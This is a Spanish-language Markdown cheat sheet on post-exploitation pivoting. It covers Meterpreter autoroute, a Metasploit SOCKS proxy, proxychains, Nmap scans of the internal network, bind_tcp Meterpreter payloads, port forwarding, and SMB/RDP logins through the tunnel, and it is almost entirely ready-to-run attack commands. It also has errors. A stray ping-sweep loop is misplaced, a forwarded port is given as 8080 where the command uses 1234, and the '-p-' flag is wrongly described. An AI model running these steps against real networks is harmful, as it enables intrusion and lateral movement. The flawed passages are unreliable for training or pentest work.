### 🔥 **Pivoting con `proxychains` en Metasploit**

Si quieres usar herramientas externas como **Nmap, RDP o SMB** para explorar la red interna, necesitas configurar un **túnel SOCKS** y enrutar el tráfico a través de la máquina comprometida.

---

## 🚀 **1️⃣ Configurar `autoroute` en Meterpreter**

Si no lo has hecho, añade la ruta de la red interna a través de la máquina pivot:

```bash
run autoroute -s 10.0.16.0/20
```

Verifica que la ruta está agregada:

```bash
run autoroute -p
```

O usa:
`for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.0.%i > nul && echo 192.168.0.%i is up.`
```bash
route print
```

---

## 🌐 **2️⃣ Configurar el servidor SOCKS en Metasploit**

Para redirigir el tráfico a través de la máquina comprometida, ejecuta:

```bash
use auxiliary/server/socks_proxy
set SRVPORT 1080  # Puerto del proxy SOCKS
set VERSION 5     # Usamos SOCKS5
run
```

o

```bash
use auxiliary/server/socks_proxy
set SRVPORT 9050  # Puerto del proxy SOCKS4
set VERSION 4a     # Usamos SOCKS4
run
```

✅ Esto crea un **servidor SOCKS en `localhost:1080`** que enviará tráfico a la red interna **a través de Meterpreter**.

---

## 🛠 **3️⃣ Configurar `proxychains`**

Ahora necesitamos decirle a **`proxychains`** que use el proxy SOCKS de Metasploit.

📌 **Edita el archivo de configuración de `proxychains`**

```bash
nano /etc/proxychains.conf
```

🔹 **Cambia la última línea** para definir el proxy SOCKS5 de Metasploit:

```
socks5 127.0.0.1 1080
```

o

```
socks4 127.0.0.1 9050
```

Guarda y cierra el archivo (`CTRL + X`, `Y`, `ENTER`).

---

## 🎯 **4️⃣ Usar herramientas con `proxychains`**

Ahora puedes usar cualquier herramienta a través del túnel SOCKS.

### 🔍 **Escanear la red interna con Nmap**

```bash
proxychains nmap -sT -Pn -n -p 445,3389 10.0.16.0/20
```

🔹 **Explicación**:

- `-sT` → Escaneo TCP (porque SYN no funciona bien con SOCKS).
- `-Pn` → No hacer ping, asumir que los hosts están activos.
- `-n` → No resolver DNS.
- `-p 445,3389` → Buscar puertos SMB y RDP.

### 🔍 **Escanear una ip identificada con Nmap**

```bash
proxychains nmap -sT -Pn -n -p- -sCV 10.0.16.48
```

🔹 **Explicación**:

- `-sT` → Escaneo TCP (porque SYN no funciona bien con SOCKS).
- `-Pn` → No hacer ping, asumir que los hosts están activos.
- `-n` → No resolver DNS.
- `-p-` → Buscar puertos SMB y RDP.
- `-sCV es el conjunto de dos comandos juntos` → `-sC` = ejecuta scripts comunes para el puerto encontrado, `-sV` = identifica la version del servicio corriendo en el puerto encontrado

## **Cargar exploit con msfconsole en la maquina identificada**

- Si estás utilizando `proxychains`, asegúrate de que el exploit se ejecute a través del túnel SOCKS:

```shell
set Proxies socks4:<IP donde corre el proxy (comunmente localhost 127.0.0.1)>:<puerto SOCKS>
```

Cuando se realiza un ataque de este tipo debemos usar el bind_tcp

- Windows: `set PAYLOAD windows/meterpreter/bind_tcp`
- Linux: `set PAYLOAD linux/meterpreter/bind_tcp`

### ✅ **Haz el port forwarding (con Meterpreter, si aplica)**

👉 Ejecuta:

```bash
portfwd add -l 1234 -p 80 -r 10.4.22.56
```

👉 Explicación:

| Parámetro         | Descripción                                         |
| ----------------- | --------------------------------------------------- |
| **-l 1234**       | Es el puerto local en tu máquina. (localhost:1234)  |
| **-p 80**         | Es el puerto del servidor víctima (puerto 80 HTTP). |
| **-r 10.4.22.56** | Es la IP del servidor víctima.                      |

 **Lo que hace esto:**

- Redirige TODO lo que entre a `localhost:8080` ➡️ al servidor web de la víctima (`10.4.22.56:80`

### 🖥 **Conectar a SMB en la red interna**

```bash
proxychains smbclient -L //10.0.20.50 -U usuario%contraseña
```

### 🖥 **Conectar a RDP en la red interna**

```bash
proxychains xfreerdp /u:admin /p:password /v:10.0.20.50
```

### 📂 **Montar un recurso compartido SMB**

```bash
proxychains mount -t cifs //10.0.20.50/share /mnt -o username=admin,password=contraseña
```

---

## 🏆 **Resumen**

✅ **1️⃣ Configurar `autoroute`** en Meterpreter para enrutar tráfico interno.  
✅ **2️⃣ Iniciar un servidor SOCKS** en Metasploit (`auxiliary/server/socks_proxy`).  
✅ **3️⃣ Configurar `proxychains`** en `/etc/proxychains.conf`.  
✅ **4️⃣ Usar herramientas externas** (`nmap`, `smbclient`, `xfreerdp`, etc.) para atacar la red interna.

🔥 **Con esto, puedes explorar la red pivotando desde la máquina comprometida sin depender solo de Metasploit.**